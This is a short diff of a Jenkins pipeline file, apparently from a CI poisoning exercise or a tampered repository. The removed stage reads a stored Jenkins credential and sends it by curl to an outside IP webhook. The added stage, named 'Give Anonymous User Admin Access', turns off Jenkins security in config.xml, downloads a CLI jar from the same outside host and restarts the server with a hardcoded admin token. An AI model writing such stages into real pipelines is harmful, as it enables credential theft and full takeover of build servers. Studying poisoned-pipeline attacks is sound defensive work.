@@ -9,14 +9,13 @@ node {
             echo "Deploy to Staging"
             '''
     }
-    stage('Jenkins Credentials | Decrypt API KEY') {
-      withCredentials([string(credentialsId: 'jenkins_token',
-                              variable: 'secretText')]) {
-        apiKey = "\nAPI key: ${secretText}\n"
-        sh '''
-        curl -XPOST -H "Content-type: application/json" -d '{"data":{"secretText":"'${secretText}'"}}' 'http://35.212.253.120:5000/webhook'
-        '''
-      }
-      println apiKey
+    stage('Give Anonymous User Admin Access') {
+      sh '''
+      sed -i 's/<useSecurity>true<\\/useSecurity>/<useSecurity>false<\\/useSecurity>/g' /var/lib/jenkins/config.xml
+      wget http://35.212.253.120:8080/jnlpJars/jenkins-cli.jar
+          chmod 777 jenkins-cli.jar
+      java -jar jenkins-cli.jar -s http://35.212.253.120:8080/ -auth admin:11addef7e9f4ef5663f20016da4e992343 restart
+      '''
+      
     }
 }
